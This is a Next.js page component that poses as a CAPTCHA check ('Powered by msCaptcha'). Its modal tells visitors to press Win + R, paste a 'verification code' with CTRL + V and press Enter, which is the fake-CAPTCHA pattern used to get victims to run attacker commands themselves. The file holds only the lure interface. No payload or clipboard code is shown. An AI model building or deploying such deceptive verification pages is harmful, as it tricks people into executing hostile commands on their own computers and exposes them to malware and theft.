import Head from "next/head";
import { useState } from "react";

export default function Home() {
  const [isModalOpen, setIsModalOpen] = useState(false);

  const handleVerifyClick = () => {
    setIsModalOpen(true);
  };

  const handleCloseClick = () => {
    setIsModalOpen(false);
  };

  return (
    <div className="container">
      <Head>
        <title>Verification Required</title>
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <main>
        {!isModalOpen && (
          <div className="verification-box">
            <h1>Verification Required</h1>
            <p>To proceed, follow these steps to verify that you are not a robot:</p>
            <button className="verify-button" onClick={handleVerifyClick}>
              Verify
            </button>
            <p className="powered-by">Powered by msCaptcha</p>
          </div>
        )}

        {isModalOpen && (
          <div className="modal-overlay">
            <div className="modal">
              <h2>Waiting for Verification...</h2>
              <p>Please follow these steps:</p>
              <ol>
                <li>Press <strong>Win + R</strong> on your keyboard.</li>
                <li>Press <strong>CTRL + V</strong> to paste the verification code.</li>
                <li>Press <strong>Enter</strong>.</li>
              </ol>
              <button className="close-button" onClick={handleCloseClick}>
                Close
              </button>
            </div>
          </div>
        )}
      </main>

      <style jsx>{`
        .container {
          display: flex;
          justify-content: center;
          align-items: center;
          height: 100vh;
          background-color: #f7fafa;
        }
        .verification-box {
          text-align: center;
          background-color: #fff;
          padding: 20px 40px;
          border-radius: 10px;
          box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .verification-box h1 {
          font-size: 24px;
          margin-bottom: 10px;
          color: #333;
        }
        .verification-box p {
          font-size: 16px;
          color: #666;
        }
        .verify-button {
          background-color: #77bfea;
          color: #fff;
          border: none;
          border-radius: 5px;
          padding: 10px 20px;
          cursor: pointer;
          margin-top: 15px;
          font-size: 16px;
        }
        .verify-button:hover {
          background-color: #6aaedd;
        }
        .powered-by {
          margin-top: 10px;
          font-size: 12px;
          color: #aaa;
        }
        .modal-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background-color: rgba(0, 0, 0, 0.5);
          display: flex;
          justify-content: center;
          align-items: center;
        }
        .modal {
          background-color: #fff;
          padding: 30px;
          border-radius: 10px;
          text-align: center;
          box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .modal h2 {
          font-size: 22px;
          margin-bottom: 15px;
          color: #333;
        }
        .modal p {
          font-size: 16px;
          color: #666;
          margin-bottom: 10px;
        }
        .modal ol {
          text-align: left;
          margin: 15px 0;
        }
        .modal li {
          margin-bottom: 10px;
          color: #333;
        }
        .close-button {
          background-color: #77bfea;
          color: #fff;
          border: none;
          border-radius: 5px;
          padding: 10px 20px;
          cursor: pointer;
          margin-top: 15px;
          font-size: 16px;
        }
        .close-button:hover {
          background-color: #6aaedd;
        }
      `}</style>
    </div>
  );
}
